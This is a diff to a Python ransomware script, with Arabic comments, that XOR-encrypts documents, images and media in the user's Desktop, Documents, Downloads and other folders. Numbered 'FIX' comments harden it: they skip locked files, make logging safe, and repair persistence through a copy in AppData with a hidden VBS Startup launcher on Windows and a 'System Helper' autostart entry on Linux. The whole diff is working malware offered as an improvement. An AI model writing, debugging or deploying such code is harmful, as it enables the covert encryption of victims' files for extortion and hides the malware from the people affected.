@@ -4,12 +4,16 @@ import sys
 import platform
 import tkinter as tk
 from tkinter import messagebox
-#red
+import tempfile
+
 # ================== الإعدادات ==================
 KEY = "tHeD!wAsHere"
 SCRIPT_NAME = "system_helper.py"
-LOCK_FILE = "/tmp/.ransomware_lock" if platform.system() == 'Linux' else os.path.join(os.getenv('TEMP'), '.ransomware_lock')
-LOG_FILE  = "/tmp/ransomware_debug.log"
+
+# FIX 1: Use a cross-platform temp directory for the lock file and log file
+TEMP_DIR = tempfile.gettempdir()
+LOCK_FILE = os.path.join(TEMP_DIR, ".ransomware_lock")
+LOG_FILE  = os.path.join(TEMP_DIR, "ransomware_debug.log")
 
 USER_EXTENSIONS = [
     '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
@@ -24,11 +28,13 @@ IS_LINUX   = platform.system() == 'Linux'
 
 if IS_WINDOWS:
     def get_user_roots():
+        # FIX 2: Target specific user directories instead of the whole C:\ drive
         roots = []
-        for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
-            d = f"{drive}:\\"
-            if os.path.exists(d):
-                roots.append(d)
+        user_profile = os.path.expanduser('~')
+        for folder in ['Desktop', 'Documents', 'Downloads', 'Pictures', 'Music', 'Videos']:
+            path = os.path.join(user_profile, folder)
+            if os.path.exists(path):
+                roots.append(path)
         return roots
     SKIP_DIRS = ['Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
                  '$Recycle.Bin', 'System Volume Information', 'Recovery', 'Boot', 'PerfLogs']
@@ -48,18 +54,37 @@ def xor_encrypt_decrypt(data, key):
     kl = len(kb)
     return bytes([data[i] ^ kb[i % kl] for i in range(len(data))])
 
+# FIX 3: Safe logging function that won't crash the script
+def safe_log(message):
+    try:
+        with open(LOG_FILE, 'a', encoding='utf-8') as log:
+            log.write(message + "\n")
+    except Exception as e:
+        # If logging fails, just print to console so the script doesn't die
+        print(f"LOG FAILED: {message} | Error: {e}")
+
 # معالجة ملف واحد مع تسجيل الأخطاء
 def process_file(path, key):
     try:
+        # Skip if file is too large (optional, to prevent memory issues)
+        if os.path.getsize(path) > 100 * 1024 * 1024: # 100MB limit
+            return False
+
         with open(path, 'rb') as f:
             content = f.read()
+        
         new_content = xor_encrypt_decrypt(content, key)
+        
         with open(path, 'wb') as f:
             f.write(new_content)
         return True
+        
+    except PermissionError:
+        # FIX 4: Gracefully skip locked files (like Edge's domain_actions.dll)
+        safe_log(f"SKIPPED (Permission Denied): {path}")
+        return False
     except Exception as e:
-        with open(LOG_FILE, 'a') as log:
-            log.write(f"FAILED {path}: {e}\n")
+        safe_log(f"FAILED {path}: {e}")
         return False
 
 def should_skip_dir(dirpath):
@@ -87,14 +112,16 @@ def encrypt_all_user_data():
                     full = os.path.join(current_root, file)
                     if process_file(full, KEY):
                         total += 1
-    with open(LOG_FILE, 'a') as log:
-        log.write(f"Processed {total} files.\n")
+    safe_log(f"Processed {total} files.")
 
 def decrypt_all_user_data():
     # نفس دالة التشفير لأن XOR متماثل
     encrypt_all_user_data()
     if os.path.exists(LOCK_FILE):
-        os.remove(LOCK_FILE)
+        try:
+            os.remove(LOCK_FILE)
+        except Exception as e:
+            safe_log(f"Failed to remove lock file: {e}")
 
 # ================== الثبات (Persistence) ==================
 def get_persistence_path():
@@ -104,23 +131,50 @@ def get_persistence_path():
         return os.path.join(os.path.expanduser('~'), '.config', 'autostart', SCRIPT_NAME)
 
 def add_to_startup():
+    # FIX 5: Use absolute path to the current script
+    current_script_path = os.path.abspath(sys.argv[0])
+    
     if IS_WINDOWS:
         appdata = os.getenv('APPDATA')
         dest = os.path.join(appdata, SCRIPT_NAME)
+        
         if not os.path.exists(dest):
-            with open(sys.argv[0], 'rb') as src, open(dest, 'wb') as dst: dst.write(src.read())
+            try:
+                with open(current_script_path, 'rb') as src, open(dest, 'wb') as dst: 
+                    dst.write(src.read())
+            except Exception as e:
+                safe_log(f"Failed to copy script to AppData: {e}")
+                return
+
         startup = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         vbs = os.path.join(startup, 'sh.vbs')
+        
+        # Ensure pythonw path is correct
         pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
-        with open(vbs, 'w') as f: f.write(f'CreateObject("WScript.Shell").Run "{pythonw} \"{dest}\"", 0, False')
+        if not os.path.exists(pythonw):
+            pythonw = sys.executable # Fallback to python.exe if pythonw doesn't exist
+            
+        try:
+            with open(vbs, 'w') as f: 
+                f.write(f'CreateObject("WScript.Shell").Run "{pythonw} ""{dest}""", 0, False')
+        except Exception as e:
+            safe_log(f"Failed to create VBS: {e}")
+            
     else:
         home = os.path.expanduser('~')
         ad = os.path.join(home, '.config', 'autostart')
         os.makedirs(ad, exist_ok=True)
         dest = os.path.join(ad, SCRIPT_NAME)
+        
         if not os.path.exists(dest):
-            with open(sys.argv[0], 'rb') as src, open(dest, 'wb') as dst: dst.write(src.read())
-            os.chmod(dest, 0o755)
+            try:
+                with open(current_script_path, 'rb') as src, open(dest, 'wb') as dst: 
+                    dst.write(src.read())
+                os.chmod(dest, 0o755)
+            except Exception as e:
+                safe_log(f"Failed to copy script to autostart: {e}")
+                return
+
         desktop = f"""[Desktop Entry]
 Type=Application
 Name=System Helper
@@ -129,7 +183,11 @@ Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
 """
-        with open(os.path.join(ad, 'system-helper.desktop'), 'w') as f: f.write(desktop)
+        try:
+            with open(os.path.join(ad, 'system-helper.desktop'), 'w') as f: 
+                f.write(desktop)
+        except Exception as e:
+            safe_log(f"Failed to create .desktop file: {e}")
 
 def remove_from_startup():
     if IS_WINDOWS:
